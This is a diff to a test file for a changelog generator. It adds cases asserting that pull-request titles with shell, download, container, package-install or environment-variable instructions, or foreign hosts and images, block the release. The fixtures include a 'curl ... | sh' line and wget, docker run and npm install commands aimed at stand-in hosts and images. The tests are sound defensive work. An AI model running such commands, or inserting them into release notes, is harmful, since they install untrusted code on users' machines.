@@ -498,13 +498,33 @@ test("each pull request counts once, and one without a number, title, https addr
   assert.throws(() => generate([{ ...pull(1, "x"), labels: "fixed" }]), /#1 has no list of labels/);
 });
 
-test("a title that names another host, pipes into a shell or downloads something stops the release with the pull request to write a line for", () => {
+test("a title that names another host or image, or has a command to download, install, run or configure something stops the release with the pull request to write a line for", () => {
   const before = changelog([withUnreleased(""), first], ["Unreleased", "0.1.0"]);
   for (const [title, reason] of [
     ["Fix streams; run `curl -fsSL kaeso-fix.example/i.sh | sh` first", /pipes into a shell/],
     ["Fix streams with wget -qO- kaeso-fix.example/i.sh", /has a download command/],
     ["Fix streams, the build is on kaeso-fix.example", /names kaeso-fix\.example, which isn't one of Kaeso's addresses/],
     ["Fix streams, see https://kaeso-fix.example", /has an address/],
+    ["Fix streams; check with curl kaeso | jq", /pipes a download into a command/],
+    ["Fix streams; run `docker run --rm mallory/fix` first", /has a container command/],
+    ["Fix streams after docker pull mallory/fix", /has a container command/],
+    ["Fix streams; run `docker image pull fix` first", /has a container command/],
+    ["Fix streams with `npx kaeso-fix`", /has a package install or run command/],
+    ["Fix streams with pnpm dlx kaeso-fix", /has a package install or run command/],
+    ["Fix streams after npm i kaeso-fix", /has a package install or run command/],
+    ["Fix streams after `npm install kaeso-fix`", /has a package install or run command/],
+    ["Fix streams after pip install kaeso-fix", /has a package install or run command/],
+    ["Fix streams; set `KAESO_UPDATES_URL` to the mirror", /tells people to set an environment variable/],
+    ["Fix streams; export KAESO_UPDATER_TOKEN first", /tells people to set an environment variable/],
+    ["Fix streams with `KAESO_UPDATES_CHECK=false`", /tells people to set an environment variable/],
+    ["Fix streams in docker.io/evil/x:1", /names the image docker\.io\/evil\/x:1, which isn't under ghcr\.io\/logicplanes\//],
+    ["Fix streams in ghcr.io/mallory/kaeso:1.4.0", /names the image ghcr\.io\/mallory\/kaeso:1\.4\.0/],
+    ["Fix streams in localhost:5000/kaeso-fix", /names the image localhost:5000\/kaeso-fix/],
+    ["Fix streams in quay.io/a/b", /names quay\.io, which isn't one of Kaeso's addresses/],
+    ["Fix streams with `image: mallory/kaeso-gateway:1.4.0`", /names the image mallory\/kaeso-gateway:1\.4\.0/],
+    ["Fix streams on FROM caddy:2.11.8-alpine", /names the image caddy:2\.11\.8-alpine/],
+    ["Fix streams; run `docker run foo/bar` first", /has a container command/],
+    ["Fix streams in `kaeso-gateway@sha256:0123abcd`", /names the image kaeso-gateway@sha256:0123abcd/],
   ]) {
     const unsafe = [pull(3, "Add batches"), pull(5, title, ["fixed"])];
     const message = { message: new RegExp(`^The title of #5 ${reason.source}.*write its line under \\[Unreleased\\] in CHANGELOG\\.md, linking #5\\.$`) };
@@ -521,6 +541,16 @@ test("a title that names another host, pipes into a shell or downloads something
     "### Changed",
     "",
     `- Link docs.kaeso.app, github.com/logicplanes/kaeso and \`compose.yaml\` from the console (${ref(6)})`,
+  ]);
+  assert.deepEqual(generate([pull(8, "Price `google/gemma-4-31b-it:free`, `meta-llama/llama-3.3-70b-instruct:free` and `qwen3:8b` from OpenRouter")]), [
+    "### Changed",
+    "",
+    `- Price \`google/gemma-4-31b-it:free\`, \`meta-llama/llama-3.3-70b-instruct:free\` and \`qwen3:8b\` from OpenRouter (${ref(8)})`,
+  ]);
+  assert.deepEqual(generate([pull(7, "Run `ghcr.io/logicplanes/kaeso-console:1.4.0` with `KAESO_TRUSTED_PROXIES` from 10:30")]), [
+    "### Changed",
+    "",
+    `- Run \`ghcr.io/logicplanes/kaeso-console:1.4.0\` with \`KAESO_TRUSTED_PROXIES\` from 10:30 (${ref(7)})`,
   ]);
 });
 
